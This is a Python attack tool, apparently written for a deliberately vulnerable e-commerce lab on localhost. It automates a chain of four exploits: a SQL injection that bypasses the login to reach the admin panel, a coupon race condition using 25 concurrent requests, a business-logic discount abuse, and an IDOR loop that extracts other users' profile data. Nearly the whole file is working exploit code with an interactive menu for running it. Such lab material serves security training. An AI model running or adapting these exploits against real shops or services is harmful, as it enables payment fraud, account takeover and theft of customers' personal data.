#!/usr/bin/env python3
"""
Automated Exploitation Scripts for Maximum Impact
"""

import requests
import json
import time
import threading
import concurrent.futures

class MaxImpactExploiter:
    def __init__(self, base_url="http://127.0.0.1:5002"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def exploit_race_condition_maximum_discount(self):
        """Exploit race condition for maximum discount"""
        print("üöÄ Executing Maximum Discount Race Condition Attack...")
        
        # Login first
        self.session.post(f"{self.base_url}/login", 
                         data={"username": "john_doe", "password": "password123"})
        
        # Add expensive item to cart
        self.session.post(f"{self.base_url}/add_to_cart", data={"product_id": 2})  # Gaming Laptop $1299.99
        
        print("üì¶ Added Gaming Laptop ($1299.99) to cart")
        
        # Function to apply coupon
        def apply_coupon(coupon_code):
            try:
                response = self.session.post(f"{self.base_url}/apply_coupon", 
                                           data={"coupon_code": coupon_code})
                return response.status_code == 200
            except:
                return False
        
        # Apply SAVE10 coupon 25 times concurrently
        print("üí• Applying SAVE10 coupon 25 times concurrently...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
            futures = [executor.submit(apply_coupon, "SAVE10") for _ in range(25)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        successful_applications = sum(results)
        print(f"‚úÖ Successfully applied coupon {successful_applications} times")
        
        # Check final price
        checkout_response = self.session.get(f"{self.base_url}/checkout")
        print(f"üí∞ Check your cart - you should have massive discounts!")
        
        return successful_applications > 1
    
    def exploit_business_logic_welcome5(self):
        """Exploit WELCOME5 business logic flaw"""
        print("üéØ Exploiting WELCOME5 Business Logic Flaw...")
        
        # Login
        self.session.post(f"{self.base_url}/login", 
                         data={"username": "jane_smith", "password": "password456"})
        
        # Add multiple different item types
        items = [1, 2, 3, 4, 5]  # Different product types
        for item_id in items:
            self.session.post(f"{self.base_url}/add_to_cart", data={"product_id": item_id})
            print(f"üì¶ Added product {item_id} to cart")
        
        # Apply WELCOME5 (should give $50 per item TYPE)
        response = self.session.post(f"{self.base_url}/apply_coupon", 
                                   data={"coupon_code": "WELCOME5"})
        
        if response.status_code == 200:
            print("üí∏ WELCOME5 applied - should get $50 off PER ITEM TYPE!")
            print(f"üéä Expected discount: $250 (5 items √ó $50 each)")
            print("üí∞ Check your cart - items might be FREE with money back!")
            return True
        
        return False
    
    def exploit_sql_injection_admin_access(self):
        """Get admin access via SQL injection"""
        print("üîì Exploiting SQL Injection for Admin Access...")
        
        payload = "admin' OR '1'='1' --"
        response = self.session.post(f"{self.base_url}/login", 
                                   data={"username": payload, "password": "anything"})
        
        if "dashboard" in response.url or "admin" in response.text:
            print("üëë Admin access gained via SQL injection!")
            
            # Access admin wallet functionality
            admin_response = self.session.get(f"{self.base_url}/admin")
            if admin_response.status_code == 200:
                print("üí∞ Admin panel accessible - can manipulate user wallets!")
                return True
        
        print("‚ùå SQL injection failed")
        return False
    
    def exploit_idor_data_extraction(self):
        """Extract all user data via IDOR"""
        print("üîç Exploiting IDOR for Data Extraction...")
        
        extracted_data = []
        
        for user_id in range(1, 10):
            try:
                response = self.session.get(f"{self.base_url}/profile/{user_id}")
                if response.status_code == 200 and "email" in response.text:
                    print(f"üìä Extracted data for user {user_id}")
                    extracted_data.append(user_id)
            except:
                continue
        
        print(f"üéØ Successfully extracted data for {len(extracted_data)} users")
        return len(extracted_data) > 0
    
    def full_exploitation_chain(self):
        """Execute full exploitation chain for maximum impact"""
        print("üî• EXECUTING FULL EXPLOITATION CHAIN")
        print("=" * 60)
        
        results = {}
        
        # 1. SQL Injection for admin access
        results["SQL Injection"] = self.exploit_sql_injection_admin_access()
        time.sleep(1)
        
        # 2. Business Logic Flaw
        results["Business Logic"] = self.exploit_business_logic_welcome5()
        time.sleep(1)
        
        # 3. Race Condition for maximum discount
        results["Race Condition"] = self.exploit_race_condition_maximum_discount()
        time.sleep(1)
        
        # 4. IDOR for data extraction
        results["IDOR"] = self.exploit_idor_data_extraction()
        
        # Print results
        print("\n" + "=" * 60)
        print("üéØ EXPLOITATION RESULTS")
        print("=" * 60)
        
        for exploit, success in results.items():
            status = "‚úÖ SUCCESS" if success else "‚ùå FAILED"
            print(f"{exploit:<20} {status}")
        
        successful_exploits = sum(results.values())
        print(f"\nüìä {successful_exploits}/{len(results)} exploits successful")
        
        if successful_exploits > 0:
            print("\nüéä CONGRATULATIONS! You've successfully exploited the lab!")
            print("üí∞ Check your cart and profile for the results")
            print("üîß Use Burp Suite or browser dev tools to see the full impact")

def main():
    print("üî• MAXIMUM IMPACT EXPLOITATION TOOL")
    print("This tool demonstrates the most impactful vulnerabilities")
    print("‚ö†Ô∏è  For educational purposes only!")
    
    base_url = input("Enter base URL (default: http://127.0.0.1:5002): ").strip()
    if not base_url:
        base_url = "http://127.0.0.1:5002"
    
    exploiter = MaxImpactExploiter(base_url)
    
    choice = input("\nSelect option:\n1. Full exploitation chain\n2. Race condition only\n3. Business logic only\nChoice (1-3): ").strip()
    
    if choice == "1":
        exploiter.full_exploitation_chain()
    elif choice == "2":
        exploiter.exploit_race_condition_maximum_discount()
    elif choice == "3":
        exploiter.exploit_business_logic_welcome5()
    else:
        print("Invalid choice. Running full chain...")
        exploiter.full_exploitation_chain()

if __name__ == "__main__":
    main()
